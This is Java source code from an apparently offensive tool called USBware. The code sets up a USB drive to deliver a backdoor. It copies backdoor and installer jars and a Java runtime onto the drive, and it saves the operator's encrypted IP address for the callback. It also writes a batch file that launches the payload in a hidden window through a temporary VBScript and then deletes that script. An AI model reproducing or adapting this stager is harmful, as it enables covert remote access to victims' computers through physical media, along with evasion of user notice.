package com.github.thatcherdev.usbware.usbware;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Arrays;
import javax.swing.filechooser.FileSystemView;
import org.apache.commons.io.FileUtils;
import com.github.thatcherdev.usbware.backend.Utils;

public class Setup {

	/**
	 * Prompt user to select letter of USB drive to convert.
	 * 
	 * @return letter of USB drive to convert
	 */
	public static String windowsDriveSelect() {
		System.out.println("Insert a USB drive and press ENTER to continue...");
		USBware.sc.nextLine();
		File[] roots=File.listRoots();
		if(roots.length==1)
			USBware.error("No USB drive found");
		System.out.println("Enter letter of USB drive (in parentheses) to convert:");
		for(File file:roots)
			if(!file.getAbsolutePath().equals("C:\\")){
				String info=FileSystemView.getFileSystemView().getSystemDisplayName(file);
				System.out.println(info.substring(0, info.lastIndexOf("("))+"\t(letter: "+file.getAbsolutePath().substring(0, 1)+")");
			}
		String drive=USBware.getInput("drive");
		return drive;
	}

	/**
	 * Convert USB drive with letter {@link drive} to a backdoor installation tool.
	 * 
	 * @param drive letter of USB drive to convert
	 * @throws IOException
	 */
	public static void windowsInstallSetup(String drive, boolean jre) throws IOException {
		if(jre){
			String jrePath=System.getProperty("java.home");
			FileUtils.copyDirectory(new File(jrePath+"\\bin"), new File(drive+":\\resources\\jre\\bin"));
			FileUtils.copyDirectory(new File(jrePath+"\\lib"), new File(drive+":\\resources\\jre\\lib"));
		}
		FileUtils.copyDirectory(new File("scripts"), new File(drive+":\\resources\\scripts"));
		FileUtils.copyFile(new File("target\\install.jar"), new File(drive+":\\install.jar"));
		FileUtils.copyFile(new File("target\\backdoor.jar"), new File(drive+":\\resources\\backdoor.jar"));
		createBat(drive+":\\run.bat", "resources\\jre", "install");
		PrintWriter out=new PrintWriter(new File(drive+":\\resources\\ip.txt"));
		out.println(Utils.crypt(Utils.getIP(), "USBwareIP"));
		out.flush();
		out.close();
	}

	/**
	 * Convert USB drive with letter {@link drive} to a backdoor.
	 * 
	 * @param drive letter of USB drive to convert
	 * @throws IOException
	 */
	public static void windowsRunSetup(String drive, boolean jre) throws IOException {
		if(jre){
			String jrePath=System.getProperty("java.home");
			FileUtils.copyDirectory(new File(jrePath+"\\bin"), new File(drive+":\\jre\\bin"));
			FileUtils.copyDirectory(new File(jrePath+"\\lib"), new File(drive+":\\jre\\lib"));
		}
		FileUtils.copyDirectory(new File("scripts"), new File(drive+":\\scripts"));
		FileUtils.copyFile(new File("target\\backdoor.jar"), new File(drive+":\\backdoor.jar"));
		createBat(drive+":\\run.bat", "jre", "backdoor");
		PrintWriter out=new PrintWriter(new File(drive+":\\ip.txt"));
		out.println(Utils.crypt(Utils.getIP(), "USBwareIP"));
		out.flush();
		out.close();
	}

	/**
	 * Prompt user to select USB drive to convert. Mounts this USB drive.
	 */
	public static void linuxDriveMount() {
		System.out.println("Insert a USB drive, unmount it (if mounted), and press ENTER to continue...");
		USBware.sc.nextLine();
		ArrayList<String> devices=new ArrayList<String>(Arrays.asList(Utils.runBashCommand("ls /dev/disk/by-label/").split("\n")));
		System.out.println("Enter name of USB drive (in parentheses) to convert:");
		for(String device:devices){
			String nameInfo=Utils.runBashCommand("file /dev/disk/by-label/"+device);
			System.out.println(device+"\t(name: "+nameInfo.substring(nameInfo.lastIndexOf("/")+1)+")");
		}
		String name=USBware.getInput("");
		Utils.runBashCommand("sudo mkdir /media/USBware");
		Utils.runBashCommand("sudo chown -R "+System.getProperty("user.name")+":"+System.getProperty("user.name")+" /media/USBware");
		Utils.runBashCommand("sudo mount /dev/"+name+" /media/USBware -o uid="+System.getProperty("user.name")+",gid="+System.getProperty("user.name"));
	}

	/**
	 * Converts USB drive mounted to /media/EvilUSB/ to a backdoor installation
	 * tool.
	 * 
	 * @throws IOException
	 */
	public static void linuxInstallSetup() throws IOException {
		if(new File("jre").isDirectory() && (new File("jre/bin/").isDirectory() && new File("jre/lib/").isDirectory())){
			FileUtils.copyDirectory(new File("jre/bin/"), new File("/media/USBware/resources/jre/bin/"));
			FileUtils.copyDirectory(new File("jre/lib/"), new File("/media/USBware/resources/jre/lib/"));
		}
		FileUtils.copyDirectory(new File("scripts/"), new File("/media/USBware/resources/scripts/"));
		FileUtils.copyFile(new File("target/install.jar"), new File("/media/USBware/install.jar"));
		FileUtils.copyFile(new File("target/backdoor.jar"), new File("/media/USBware/resources/backdoor.jar"));
		createBat("/media/USBware/run.bat", "resources\\jre", "install");
		PrintWriter out=new PrintWriter(new File("/media/USBware/resources/ip.txt"));
		out.println(Utils.crypt(Utils.getIP(), "USBwareIP"));
		out.flush();
		out.close();
	}

	/**
	 * Converts USB drive mounted to /media/EvilUSB/ to a backdoor.
	 * 
	 * @throws IOException
	 */
	public static void linuxRunSetup() throws IOException {
		if(new File("jre").isDirectory() && (new File("jre/bin/").isDirectory() && new File("jre/lib/").isDirectory())){
			FileUtils.copyDirectory(new File("jre/bin/"), new File("/media/USBware/jre/bin/"));
			FileUtils.copyDirectory(new File("jre/lib/"), new File("/media/USBware/jre/lib/"));
		}
		FileUtils.copyDirectory(new File("scripts/"), new File("/media/USBware/scripts/"));
		FileUtils.copyFile(new File("target/backdoor.jar"), new File("/media/USBware/backdoor.jar"));
		createBat("/media/USBware/run.bat", "jre", "backdoor");
		PrintWriter out=new PrintWriter(new File("/media/USBware/ip.txt"));
		out.println(Utils.crypt(Utils.getIP(), "USBwareIP"));
		out.flush();
		out.close();
	}

	/**
	 * Unmounts /media/EvilUSB/ and removes the folder.
	 */
	public static void linuxFinish() {
		Utils.runBashCommand("sudo umount /media/USBware");
		Utils.runBashCommand("sudo rm -r /media/USBware");
	}

	/**
	 * Creates a '.bat' batch file for running a jar file in a Java Runtime
	 * Environment (if packaged with the jar).
	 * 
	 * @param filePath Path of '.bat' batch file to create.
	 * @param jrePath  Path to jre if bundled.
	 * @param jarName  Name of '.jar' file to run.
	 * @throws FileNotFoundException
	 */
	private static void createBat(String filePath, String jrePath, String jarName) throws FileNotFoundException {
		PrintWriter out=new PrintWriter(new File(filePath));
		out.println("@echo off\n%~d0 & cd %~dp0\necho Set objShell = WScript.CreateObject(\"WScript.Shell\")>run.vbs\necho objShell.Run \"cmd /c if exist "+jrePath+"\\ ("+jrePath+"\\bin\\java "
			+"-jar "+jarName+".jar) else (java -jar "+jarName+".jar)\", ^0, True>>run.vbs\nstart run.vbs\ncall:delvbs\n:delvbs\nif exist run.vbs (\n timeout 1 > nul\n del run.vbs\n @exit\n"
			+") else (\ncall:delvbs\n)\ngoto:eof");
		out.flush();
		out.close();
	}
}